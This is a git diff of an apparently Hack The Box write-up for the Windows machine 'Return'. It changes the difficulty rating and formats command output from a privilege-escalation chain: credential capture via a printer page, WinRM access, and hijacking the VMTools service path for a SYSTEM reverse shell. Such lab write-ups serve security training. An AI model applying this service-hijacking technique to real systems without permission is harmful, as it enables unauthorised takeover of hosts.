@@ -23,7 +23,7 @@ tags: [htb, return, windows, active-directory, iis, burp, service-hijacking, pri
 
 ## Introduction
 
-Return is a Medium difficulty Windows machine featuring an Active Directory environment with a printer management interface. The attack chain involves intercepting IIS traffic to capture credentials, establishing WinRM access, and leveraging Server Operators group membership to hijack a high-privileged service.
+Return is an Easy difficulty Windows machine featuring an Active Directory environment with a printer management interface. The attack chain involves intercepting IIS traffic to capture credentials, establishing WinRM access, and leveraging Server Operators group membership to hijack a high-privileged service.
 
 The initial foothold is obtained through a misconfigured printer settings endpoint that accepts user-supplied configuration, which is intercepted and modified in Burp Suite to capture credentials. With `svc-printer` credentials, WinRM access is established.
 
@@ -202,7 +202,7 @@ whoami /priv
 ```
 
 **Enabled Privileges:**
-
+```bash
 SeMachineAccountPrivilege Add workstations to domain Enabled
 SeLoadDriverPrivilege Load and unload device drivers Enabled
 SeSystemtimePrivilege Change the system time Enabled
@@ -213,7 +213,7 @@ SeChangeNotifyPrivilege Bypass traverse checking Enabled
 SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 SeTimeZonePrivilege Change the time zone Enabled
-
+```
 
 **Key Privileges:** `SeBackupPrivilege`, `SeRestorePrivilege`, `SeLoadDriverPrivilege`
 
@@ -226,11 +226,11 @@ whoami /groups
 ```
 
 **Notable Groups:**
-
+```bash
 BUILTIN\Print Operators Alias S-1-5-32-550
 BUILTIN\Server Operators Alias S-1-5-32-549 ← CRITICAL
 BUILTIN\Remote Management Users Alias S-1-5-32-580
-
+```
 
 **Key Discovery:** Membership in `Server Operators` group allows service modification.
 
@@ -261,14 +261,14 @@ sc.exe qc VMTools
 ```
 
 **Service Details:**
-
+```bash
 SERVICE_NAME: VMTools
 TYPE : 10 WIN32_OWN_PROCESS
 START_TYPE : 2 AUTO_START
 ERROR_CONTROL : 1 NORMAL
 BINARY_PATH_NAME : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
 SERVICE_START_NAME : LocalSystem
-
+```
 
 **Exploitation Path:** Modify `BINARY_PATH_NAME` to execute arbitrary command as `LocalSystem`.
 
@@ -327,13 +327,13 @@ sc.exe start VMTools
 Received reverse shell connection as `NT AUTHORITY\SYSTEM`:
 
 ![NT AUTHORITY SYSTEM Shell](/assets/img/05-nt-auth-system.jpg)
-
+```bash
 Connection received on 10.129.82.179 58753
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.
 C:\Windows\system32> whoami
 nt authority\system
-
+```
 
 ### Root Flag
 
